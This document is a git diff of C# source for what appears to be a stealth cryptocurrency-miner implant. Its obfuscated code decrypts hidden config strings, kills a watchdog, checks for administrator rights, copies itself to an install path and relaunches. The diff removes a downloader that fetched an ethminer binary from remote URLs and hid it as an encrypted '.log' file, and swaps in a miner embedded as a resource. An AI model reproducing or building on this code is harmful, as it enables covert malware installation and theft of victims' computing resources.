@@ -48,7 +48,8 @@ public partial class RProgram
             string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
 #endif
 #if DefInstall
-            try{
+            try
+            {
                 string _rplp_ = PayloadPath;
 #if DefShellcode
                 string _rcmdl_ = Environment.GetCommandLineArgs()[1];
@@ -58,12 +59,6 @@ public partial class RProgram
                 if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                 {
                     _rKillWatchdog_();
-
-                    try
-                    {
-                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
-                    } 
-                    catch {}
 
                     try{
                         if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
@@ -89,7 +84,7 @@ public partial class RProgram
 
                     Thread.Sleep(10000);
                     Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
-                    File.WriteAllBytes(_rplp_, File.ReadAllBytes(_rcmdl_));
+                    File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2 * 1000);
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                     Environment.Exit(0);
@@ -149,47 +144,7 @@ public partial class RProgram
                     }
                 }
 
-                byte[] _reT_ = { };
-
-#if DefDownloader
-                try
-                {
-                    if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")))
-                    {
-                        using (var client = new System.Net.WebClient())
-                        {
-                            try
-                            {
-                                _reT_ = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMMINERURL")));
-                            }
-                            catch(Exception ex){
-#if DefDebug
-                                MessageBox.Show("M6.5: Couldn't get ethminer from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
-#endif
-                            }
-                            if (_reT_.Length == 0) {
-                                _reT_ = client.DownloadData(_rGetString_("#MINERURL"));
-                            }
-                        }
-#if DefInstall
-                        if (_reT_.Length > 0) {
-                            File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"), _rAESMethod_(_reT_, true));
-                        }
-#endif
-                    }
-                    else
-                    {
-                        _reT_ = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")));
-                    }
-                }
-                catch(Exception ex){
-#if DefDebug
-                    MessageBox.Show("MCDL: " + Environment.NewLine + ex.ToString());
-#endif
-                }
-#else
-                _reT_ = _rGetTheResource_("#eth");
-    #endif
+                byte[] _reT_ = _rGetTheResource_("#eth");
 
                 try
                 {
@@ -258,7 +213,7 @@ public partial class RProgram
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
     public static void _rKillWatchdog_()
